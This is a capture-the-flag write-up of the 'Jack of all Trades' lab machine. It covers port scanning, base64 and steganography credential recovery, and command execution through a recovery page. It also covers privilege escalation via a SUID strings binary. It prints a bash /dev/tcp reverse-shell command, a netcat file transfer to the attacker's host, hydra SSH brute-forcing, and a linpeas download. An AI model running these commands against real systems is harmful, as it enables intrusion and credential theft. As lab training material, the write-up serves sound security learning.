Jack of all Trades

------------------------------
Aaron Aguilar
03-03-2023
------------------------------

```

Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?


```
using nmap i scanned all ports and their services first

```

PORT   STATE SERVICE REASON         VERSION
22/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_http-title: Jack-of-all-trades!
|_http-server-header: Apache/2.4.10 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
80/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13b7f0a114e2d32540ff4b9460c5003d (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBANucPy+D67M/cKVTYaHYYpt9bqPviYbWW/4+BFnUOQoNordc9Pc+8CauJqNFiebIqpKYKXhpEAt82m1IjQh8EmWdJYcQnkMFgukM3/mGjngXTbUO8vAbi53Zy8wwOaBlmRK9mvfAYEWPkcjzRmYgSp51TgEtSGWIyAkc1Lx6YVtDAAAAFQCsIgZJlrsYvAtF7Rmho7lIdn0WOwAAAIEApri35SyOophhqX45JcDpVASe3CSs8tPMGoOc0I9ZtTGt5qyb1cl7N3tXsP6mlrw4d4YNo8ct0w6TjsxPcJjGitRQ+SILWHy72XZ5Chde6yewKB5BeBjXrYvRR1rW+Tpia5kyjB4s0mGB7o3FMjX/dT+ISqYvZeVa7mQnBo0f0XMAAACAP89Ag2kmcs0FBt7KCBieH3UB6gF+LdeRVJHio5p4VQ8cTY1NZDyWqudS1TJq1BAToJSz9MqwUwzlILjRjuGQtylpssWSRbHyM0aqmJdORSMOCMUiEwyfk6T8+Vmama/AN7/htZeWBjWVeVEnbYJJQ6kPSCvZodMdOggYXcv32CA=
|   2048 910cd643d940c388b1be350bbcb99088 (RSA)

```
First, I was I feel stucked and then for a moment, I saw that port 22 service is HTTP which is stange because most of the time it is SSH. and then port 80 service is ssh. So  I go ahead and investigated what can be seen on port 22 , but it says that port is restricted using firefox or brave.. so we need to enable unrestrict the banned ports.. in my firefox I did this
```
in the address bar type
about:config
and then search this 
network.security.ports.banned.override
add a string in this case 22
and enable ports 22 and after that you should be done

```
now I can see the site
```
Welcome to Jack-of-all-trades!

My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!
I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.

My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!

Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I always clear up after myself.

I love dinosaurs. I have a huge collection of models. Like this one:

I make a lot of models myself, but I also do toys, like this one:

I hope you choose to employ me. I love making new friends!

Hope to see you soon!

Jack

```
Now we are able to get the username which is Jack all we need now is the username and inspecting html code we can get a hint
```

<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->

```
it seems like the text is made using base64 dont worry we will crack it easily just follow my steps, just type this in the terminal
```
└─$ echo 'UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==' | base64 -d

Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq

````
now we have a 2 usernames and password which is Johny Graves and Jack
Pass: u?WtKSraq

I tried to login to the ssh using both usernames and pw but I got no luck, so I proceeded to go the hidden directory which is /recovery.php
I tried to log in to /recovery.php but I am unbale to get in... at the meantime, since we know there is a hidden directory, I tried to find hidden directories

```
feroxbuster -u http://http://10.10.175.215:22/ -e 
dirb http://10.10.175.215:22/


```
from there I was able to find /assets
and downloaded files 
I got this files from downloading
```
wget -r http://10.10.175.215:22/assets/ 
--2023-03-06 01:35:41--  http://10.10.175.215:22/assets/
Connecting to 10.10.175.215:22... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1548 (1.5K) [text/html]
Saving to: ‘10.10.175.215:22/assets/index.html’

10.10.175.215:22/assets/in 100%[=======================================>]   1.51K  --.-KB/s    in 0s      

2023-03-06 01:35:42 (4.44 MB/s) - ‘10.10.175.215:22/assets/index.html’ saved [1548/1548]

Loading robots.txt; please ignore errors.
--2023-03-06 01:35:42--  http://10.10.175.215:22/robots.txt
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 404 Not Found
2023-03-06 01:35:42 ERROR 404: Not Found.

--2023-03-06 01:35:42--  http://10.10.175.215:22/icons/blank.gif
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 148 [image/gif]
Saving to: ‘10.10.175.215:22/icons/blank.gif’

10.10.175.215:22/icons/bla 100%[=======================================>]     148  --.-KB/s    in 0s      

2023-03-06 01:35:42 (9.81 MB/s) - ‘10.10.175.215:22/icons/blank.gif’ saved [148/148]

--2023-03-06 01:35:42--  http://10.10.175.215:22/assets/?C=N;O=D
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 1548 (1.5K) [text/html]
Saving to: ‘10.10.175.215:22/assets/index.html?C=N;O=D’

10.10.175.215:22/assets/in 100%[=======================================>]   1.51K  --.-KB/s    in 0s      

2023-03-06 01:35:43 (141 MB/s) - ‘10.10.175.215:22/assets/index.html?C=N;O=D’ saved [1548/1548]

--2023-03-06 01:35:43--  http://10.10.175.215:22/assets/?C=M;O=A
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 1548 (1.5K) [text/html]
Saving to: ‘10.10.175.215:22/assets/index.html?C=M;O=A’

10.10.175.215:22/assets/in 100%[=======================================>]   1.51K  --.-KB/s    in 0s      

2023-03-06 01:35:43 (96.9 MB/s) - ‘10.10.175.215:22/assets/index.html?C=M;O=A’ saved [1548/1548]

--2023-03-06 01:35:43--  http://10.10.175.215:22/assets/?C=S;O=A
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 1548 (1.5K) [text/html]
Saving to: ‘10.10.175.215:22/assets/index.html?C=S;O=A’

10.10.175.215:22/assets/in 100%[=======================================>]   1.51K  --.-KB/s    in 0s      

2023-03-06 01:35:43 (87.8 MB/s) - ‘10.10.175.215:22/assets/index.html?C=S;O=A’ saved [1548/1548]

--2023-03-06 01:35:43--  http://10.10.175.215:22/assets/?C=D;O=A
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 1548 (1.5K) [text/html]
Saving to: ‘10.10.175.215:22/assets/index.html?C=D;O=A’

10.10.175.215:22/assets/in 100%[=======================================>]   1.51K  --.-KB/s    in 0s      

2023-03-06 01:35:43 (218 MB/s) - ‘10.10.175.215:22/assets/index.html?C=D;O=A’ saved [1548/1548]

--2023-03-06 01:35:43--  http://10.10.175.215:22/icons/back.gif
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 216 [image/gif]
Saving to: ‘10.10.175.215:22/icons/back.gif’

10.10.175.215:22/icons/bac 100%[=======================================>]     216  --.-KB/s    in 0s      

2023-03-06 01:35:44 (19.2 MB/s) - ‘10.10.175.215:22/icons/back.gif’ saved [216/216]

--2023-03-06 01:35:44--  http://10.10.175.215:22/
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 1605 (1.6K) [text/html]
Saving to: ‘10.10.175.215:22/index.html’

10.10.175.215:22/index.htm 100%[=======================================>]   1.57K  --.-KB/s    in 0s      

2023-03-06 01:35:44 (96.2 MB/s) - ‘10.10.175.215:22/index.html’ saved [1605/1605]

--2023-03-06 01:35:44--  http://10.10.175.215:22/icons/image2.gif
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 309 [image/gif]
Saving to: ‘10.10.175.215:22/icons/image2.gif’

10.10.175.215:22/icons/ima 100%[=======================================>]     309  --.-KB/s    in 0s      

2023-03-06 01:35:44 (48.3 MB/s) - ‘10.10.175.215:22/icons/image2.gif’ saved [309/309]

--2023-03-06 01:35:44--  http://10.10.175.215:22/assets/header.jpg
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 70273 (69K) [image/jpeg]
Saving to: ‘10.10.175.215:22/assets/header.jpg’

10.10.175.215:22/assets/he 100%[=======================================>]  68.63K   136KB/s    in 0.5s    

2023-03-06 01:35:45 (136 KB/s) - ‘10.10.175.215:22/assets/header.jpg’ saved [70273/70273]

--2023-03-06 01:35:45--  http://10.10.175.215:22/assets/jackinthebox.jpg
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 80742 (79K) [image/jpeg]
Saving to: ‘10.10.175.215:22/assets/jackinthebox.jpg’

10.10.175.215:22/assets/ja 100%[=======================================>]  78.85K   310KB/s    in 0.3s    

2023-03-06 01:35:45 (310 KB/s) - ‘10.10.175.215:22/assets/jackinthebox.jpg’ saved [80742/80742]

--2023-03-06 01:35:45--  http://10.10.175.215:22/assets/stego.jpg
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 38015 (37K) [image/jpeg]
Saving to: ‘10.10.175.215:22/assets/stego.jpg’

10.10.175.215:22/assets/st 100%[=======================================>]  37.12K  --.-KB/s    in 0.003s  

2023-03-06 01:35:46 (13.6 MB/s) - ‘10.10.175.215:22/assets/stego.jpg’ saved [38015/38015]

--2023-03-06 01:35:46--  http://10.10.175.215:22/icons/text.gif
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 229 [image/gif]
Saving to: ‘10.10.175.215:22/icons/text.gif’

10.10.175.215:22/icons/tex 100%[=======================================>]     229  --.-KB/s    in 0s      

2023-03-06 01:35:46 (12.4 MB/s) - ‘10.10.175.215:22/icons/text.gif’ saved [229/229]

--2023-03-06 01:35:46--  http://10.10.175.215:22/assets/style.css
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 171 [text/css]
Saving to: ‘10.10.175.215:22/assets/style.css’

10.10.175.215:22/assets/st 100%[=======================================>]     171  --.-KB/s    in 0s      

2023-03-06 01:35:46 (24.0 MB/s) - ‘10.10.175.215:22/assets/style.css’ saved [171/171]

--2023-03-06 01:35:46--  http://10.10.175.215:22/assets/?C=N;O=A
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 1548 (1.5K) [text/html]
Saving to: ‘10.10.175.215:22/assets/index.html?C=N;O=A’

10.10.175.215:22/assets/in 100%[=======================================>]   1.51K  --.-KB/s    in 0s      

2023-03-06 01:35:46 (85.9 MB/s) - ‘10.10.175.215:22/assets/index.html?C=N;O=A’ saved [1548/1548]

--2023-03-06 01:35:46--  http://10.10.175.215:22/assets/?C=M;O=D
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 1548 (1.5K) [text/html]
Saving to: ‘10.10.175.215:22/assets/index.html?C=M;O=D’

10.10.175.215:22/assets/in 100%[=======================================>]   1.51K  --.-KB/s    in 0s      

2023-03-06 01:35:47 (108 MB/s) - ‘10.10.175.215:22/assets/index.html?C=M;O=D’ saved [1548/1548]

--2023-03-06 01:35:47--  http://10.10.175.215:22/assets/?C=S;O=D
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 1548 (1.5K) [text/html]
Saving to: ‘10.10.175.215:22/assets/index.html?C=S;O=D’

10.10.175.215:22/assets/in 100%[=======================================>]   1.51K  --.-KB/s    in 0s      

2023-03-06 01:35:47 (84.7 MB/s) - ‘10.10.175.215:22/assets/index.html?C=S;O=D’ saved [1548/1548]

--2023-03-06 01:35:47--  http://10.10.175.215:22/assets/?C=D;O=D
Reusing existing connection to 10.10.175.215:22.
HTTP request sent, awaiting response... 200 OK
Length: 1548 (1.5K) [text/html]
Saving to: ‘10.10.175.215:22/assets/index.html?C=D;O=D’

10.10.175.215:22/assets/in 100%[=======================================>]   1.51K  --.-KB/s    in 0s      

2023-03-06 01:35:47 (9.43 MB/s) - ‘10.10.175.215:22/assets/index.html?C=D;O=D’ saved [1548/1548]

FINISHED --2023-03-06 01:35:47--
Total wall clock time: 5.7s
Downloaded: 18 files, 201K in 0.8s (263 KB/s)


````
Now we need to find hidden texts in this files using different steganography
I tried strings and zsteg but I got no luck... however I tried the steghide tool and it seems there is something remember we have a password u?WtKSraq
```

 └─$ steghide info stego.jpg            
"stego.jpg":
  format: jpeg
  capacity: 1.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "creds.txt":
    size: 58.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
                                                                                                          
┌──(aaron㉿kali)-[~/…/Jack_of_all_trades/dir/10.10.175.215:22/assets]
└─$ steghide extract --stegofile stego.jpg 
Enter passphrase: 
wrote extracted data to "creds.txt".
                                                                                                          
┌──(aaron㉿kali)-[~/…/Jack_of_all_trades/dir/10.10.175.215:22/assets]
└─$ ls
 creds.txt   'index.html?C=D;O=A'  'index.html?C=M;O=D'  'index.html?C=S;O=A'   stego.jpg
 header.jpg  'index.html?C=D;O=D'  'index.html?C=N;O=A'  'index.html?C=S;O=D'   style.css
 index.html  'index.html?C=M;O=A'  'index.html?C=N;O=D'   jackinthebox.jpg
                                                                                                          
┌──(aaron㉿kali)-[~/…/Jack_of_all_trades/dir/10.10.175.215:22/assets]
└─$ cat creds.txt             
Hehe. Gotcha!

You're on the right path, but wrong image!
                   
```
I tried the other images and finally we got this credentials
```
└─$ steghide extract --stegofile header.jpg 
Enter passphrase: 
wrote extracted data to "cms.creds".


└─$ cat cms.creds 
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY



````
using this credentials to log in to the recovery webpage I got this message
```
GET me a 'cmd' and I'll run it for you Future-Jack.

```
it seems like we can access the files adding this code in the end of url ?cmd=
so I created a malicious netcat code to get a reverse shell, I urldecoded the netcat code below and executed in the url to sucessfully get the reverse shell

```
/bin/bash -c "bash -i >& /dev/tcp/10.6.63.158/1234 0>&1"

%2Fbin%2Fbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.6.63.158%2F1234%200%3E%261%22

````

once I got initial access, we need to upgrade the dumb shell to interactive shell
with this code
```
python -c 'import pty;pty.spawn("bin/bash")'
ctrl + z
stty raw -echo;fg
import TERM=xterm
```
Now going back to /home we can see that we have a jack and jacks_password_list
Using netcat I transferred files over to my attack machine
```
attacker machine
└─$ nc -lnvp 3333 > jacks_password_list
listening on [any] 3333 ...


connect to [10.18.70.19] from (UNKNOWN) [10.10.244.229] 40529

victim machine
nc nc 10.18.70.19 3333 < jacks_password_list

└─$ ls
45939.py      decode.sh  jack                 jacks_password_list.txt  nmap_services.tee  nmap.tee
45939.py.bak  dir        jacks_password_list  nmap_initial.txt         nmap_services.txt  README.md




```
Now I got the password list, initially I tried to log in using the username jackinthebox but was not able to get in... I checked if I need to decode the file first but no... so I tried a different username which is 'jack' and I eventually got in
```

└─$ hydra -P jacks_password_list.txt -l jack -s 80 ssh://10.10.244.229 -V        
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-06 23:43:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://10.10.244.229:80/
[ATTEMPT] target 10.10.244.229 - login "jack" - pass "*hclqAzj+2GC+=0K" - 1 of 24 [child 0] (0/0)
[ATTEMPT] target 10.10.244.229 - login "jack" - pass "eN<A@n^zI?FE$I5," - 2 of 24 [child 1] (0/0)
[ATTEMPT] target 10.10.244.229 - login "jack" - pass "X<(@zo2XrEN)#MGC" - 3 of 24 [child 2] (0/0)
[ATTEMPT] target 10.10.244.229 - login "jack" - pass ",,aE1K,nW3Os,afb" - 4 of 24 [child 3] (0/0)
[ATTEMPT] target 10.10.244.229 - login "jack" - pass "ITMJpGGIqg1jn?>@" - 5 of 24 [child 4] (0/0)
[ATTEMPT] target 10.10.244.229 - login "jack" - pass "0HguX{,fgXPE;8yF" - 6 of 24 [child 5] (0/0)
[ATTEMPT] target 10.10.244.229 - login "jack" - pass "sjRUb4*@pz<*ZITu" - 7 of 24 [child 6] (0/0)
[ATTEMPT] target 10.10.244.229 - login "jack" - pass "[8V7o^gl(Gjt5[WB" - 8 of 24 [child 7] (0/0)
[ATTEMPT] target 10.10.244.229 - login "jack" - pass "yTq0jI$d}Ka<T}PD" - 9 of 24 [child 8] (0/0)
[ATTEMPT] target 10.10.244.229 - login "jack" - pass "Sc.[[2pL<>e)vC4}" - 10 of 24 [child 9] (0/0)
[ATTEMPT] target 10.10.244.229 - login "jack" - pass "9;}#q*,A4wd{<X.T" - 11 of 24 [child 10] (0/0)
[ATTEMPT] target 10.10.244.229 - login "jack" - pass "M41nrFt#PcV=(3%p" - 12 of 24 [child 11] (0/0)
[ATTEMPT] target 10.10.244.229 - login "jack" - pass "GZx.t)H$&awU;SO<" - 13 of 24 [child 12] (0/0)
[ATTEMPT] target 10.10.244.229 - login "jack" - pass ".MVettz]a;&Z;cAC" - 14 of 24 [child 13] (0/0)
[ATTEMPT] target 10.10.244.229 - login "jack" - pass "2fh%i9Pr5YiYIf51" - 15 of 24 [child 14] (0/0)
[ATTEMPT] target 10.10.244.229 - login "jack" - pass "TDF@mdEd3ZQ(]hBO" - 16 of 24 [child 15] (0/0)
[80][ssh] host: 10.10.244.229   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found


```
so loggin to ssh with our new credentials 
```

┌──(aaron㉿kali)-[~/thm/Jack_of_all_trades]
└─$ ssh jack@10.10.244.229 -p 80                                                            
The authenticity of host '[10.10.244.229]:80 ([10.10.244.229]:80)' can't be established.
ED25519 key fingerprint is SHA256:bSyXlK+OxeoJlGqap08C5QAC61h1fMG68V+HNoDA9lk.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:13: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.244.229]:80' (ED25519) to the list of known hosts.
jack@10.10.244.229's password: 
jack@jack-of-all-trades:~$ whoami
jack
jack@jack-of-all-trades:~$ pwd
/home/jack
jack@jack-of-all-trades:~$ ls
user.jpg
jack@jack-of-all-trades:~$ 


```
Now I need to get this user.jpg to do more investigation
```
┌──(aaron㉿kali)-[~/thm/Jack_of_all_trades]
└─$ scp -P 80 jack@10.10.244.229:/home/jack/user.jpg .                         
jack@10.10.244.229's password: 
user.jpg                                                                100%  286KB 214.5KB/s   00:01  
```
using firefox to open the user.jpg we are able to get the user flag
```
securi-tay2020_{p3ngu1in-hunt3r-3xtr40d1n41r3} 

```
Now all we need to is to escalate our priveleges, so in my kali machine I hosted linpeas and downloaded it to the victim machine

```
jack@jack-of-all-trades:~$ wget http://10.18.70.19/linpeas.sh
--2023-03-07 06:15:53--  http://10.18.70.19/linpeas.sh
Connecting to 10.18.70.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828087 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                 100%[========================================>] 808.68K   455KB/s   in 1.8s   

2023-03-07 06:15:56 (455 KB/s) - ‘linpeas.sh’ saved [828087/828087]

jack@jack-of-all-trades:~$ ls
linpeas.sh  user.jpg
jack@jack-of-all-trades:~$ chmod +x linpeas.sh 
jack@jack-of-all-trades:~$ mv linpeas.sh /dev/shm
jack@jack-of-all-trades:~$ cd /dev/shm
jack@jack-of-all-trades:/dev/shm$ ls
linpeas.sh
jack@jack-of-all-trades:/dev/shm$ ./linpeas.sh 

```
also finding user permissions we are able to identify misconfigured application like strings
```
jack@jack-of-all-trades:~$ find / -perm /4000 -user root -ls 2>/dev/null
135127  456 -rwsr-xr-x   1 root     root       464904 Mar 22  2015 /usr/lib/openssh/ssh-keysign
134730  288 -rwsr-xr--   1 root     messagebus   294512 Feb  9  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
135137   12 -rwsr-xr-x   1 root     root        10248 Apr 15  2015 /usr/lib/pt_chown
132828   44 -rwsr-xr-x   1 root     root        44464 Nov 20  2014 /usr/bin/chsh
132826   56 -rwsr-xr-x   1 root     root        53616 Nov 20  2014 /usr/bin/chfn
133088   40 -rwsr-xr-x   1 root     root        39912 Nov 20  2014 /usr/bin/newgrp
133270   28 -rwsr-x---   1 root     dev         27536 Feb 25  2015 /usr/bin/strings
133273  148 -rwsr-xr-x   1 root     root       149568 Mar 12  2015 /usr/bin/sudo
133111   56 -rwsr-xr-x   1 root     root        54192 Nov 20  2014 /usr/bin/passwd
132940   76 -rwsr-xr-x   1 root     root        75376 Nov 20  2014 /usr/bin/gpasswd
133161   88 -rwsr-sr-x   1 root     mail        89248 Feb 11  2015 /usr/bin/procmail
138022 3052 -rwsr-xr-x   1 root     root      3124160 Feb 17  2015 /usr/sbin/exim4
    85   40 -rwsr-xr-x   1 root     root        40000 Mar 29  2015 /bin/mount
   131   28 -rwsr-xr-x   1 root     root        27416 Mar 29  2015 /bin/umount
   114   40 -rwsr-xr-x   1 root     root        40168 Nov 20  2014 /bin/su

```
using strings we can use it read files from privelege permissions and as the hint says, /root/root.txt we are able to get the root flag
```
jack@jack-of-all-trades:~$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}


```

